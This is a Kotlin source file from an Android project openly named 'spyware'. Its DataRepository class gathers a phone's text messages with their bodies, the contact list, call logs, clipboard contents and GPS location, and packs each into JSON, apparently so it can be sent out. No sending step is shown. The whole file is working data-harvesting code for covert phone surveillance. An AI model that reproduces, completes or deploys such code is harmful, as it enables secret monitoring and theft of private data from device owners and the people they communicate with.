package com.mhl.spyware

import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import kotlin.coroutines.resume

class DataRepository(
    private val smsRetriever: GetSms,
    private val callLogsRetriever: CallLogsRetriever,
    private val contactsRetriever: ContactsRetriever,
    private val clipboardRetriever: GetClipboard,
    private val locationRetriever: LocationUtils
) {

    private fun createErrorResponse(message: String): String {
        return JSONObject().apply {
            put("error", message)
        }.toString()
    }

    private fun createEmptyArrayResponse(key: String): String {
        return JSONObject().apply {
            put(key, JSONArray())
        }.toString()
    }

    fun getSMSData(): String {
        return try {
            val smsData = smsRetriever.getSMS()
            if (smsData.isNotEmpty()) {
                val smsArray = JSONArray()
                smsData.forEach { sms ->
                    smsArray.put(
                        JSONObject().apply {
                            put("address", sms.address)
                            put("body", sms.body)
                            put("date", sms.date)
                            put("type", sms.type)
                        }
                    )
                }
                JSONObject().apply { put("sms", smsArray) }.toString()
            } else {
                createEmptyArrayResponse("sms")
            }
        } catch (e: SecurityException) {
            Log.e("DataRepository", "SMS permission denied", e)
            createErrorResponse("SMS permission denied.")
        }
    }

    fun getContactsData(): String {
        return try {
            val contacts = contactsRetriever.getAllContacts()
            if (contacts.isNotEmpty()) {
                val contactsArray = JSONArray()
                contacts.forEach { contact ->
                    contactsArray.put(
                        JSONObject().apply {
                            put("name", contact.name)
                            put("phoneNumber", contact.phoneNumber)
                        }
                    )
                }
                JSONObject().apply { put("contacts", contactsArray) }.toString()
            } else {
                createEmptyArrayResponse("contacts")
            }
        } catch (e: SecurityException) {
            Log.e("DataRepository", "Contacts permission denied", e)
            createErrorResponse("Contacts permission denied.")
        }
    }

    fun getCallLogsData(): String {
        return try {
            val callLogs = callLogsRetriever.getCallLogs()
            if (callLogs.isNotEmpty()) {
                val callLogsArray = JSONArray()
                callLogs.forEach { log ->
                    callLogsArray.put(
                        JSONObject().apply {
                            put("phoneNumber", log.phoneNumber)
                            put("date", log.date)
                            put("duration", log.duration)
                            put("type", log.type)
                        }
                    )
                }
                JSONObject().apply { put("callLogs", callLogsArray) }.toString()
            } else {
                createEmptyArrayResponse("callLogs")
            }
        } catch (e: SecurityException) {
            Log.e("DataRepository", "Call logs permission denied", e)
            createErrorResponse("Call logs permission denied.")
        }
    }

    fun getClipboardData(): String {
        return try {
            val clipboard = clipboardRetriever.getClipboardData()
            JSONObject().apply {
                put("clipboard", clipboard.ifEmpty { "" })
            }.toString()
        } catch (e: Exception) {
            Log.e("DataRepository", "Error accessing clipboard data", e)
            createErrorResponse("Unable to retrieve clipboard data.")
        }
    }

    fun fetchLocation(onLocationUpdate: (String) -> Unit) {
        locationRetriever.getLastKnownLocation { location ->
            if (location != null) {
                val json = JSONObject().apply {
                    put("lastKnownLocation", JSONObject().apply {
                        put("latitude", location.latitude)
                        put("longitude", location.longitude)
                    })
                }
                onLocationUpdate(json.toString())
            } else {
                locationRetriever.requestLocationUpdates { updatedLocation ->
                    if (updatedLocation != null) {
                        val json = JSONObject().apply {
                            put("updatedLocation", JSONObject().apply {
                                put("latitude", updatedLocation.latitude)
                                put("longitude", updatedLocation.longitude)
                            })
                        }
                        onLocationUpdate(json.toString())
                    } else {
                        onLocationUpdate(createErrorResponse("Unable to fetch updated location."))
                    }
                }
            }
        }
    }


    suspend fun getLocationData(): String {
        return kotlinx.coroutines.suspendCancellableCoroutine { continuation ->
            fetchLocation { locationString ->
                continuation.resume(locationString)
            }
        }
    }
}
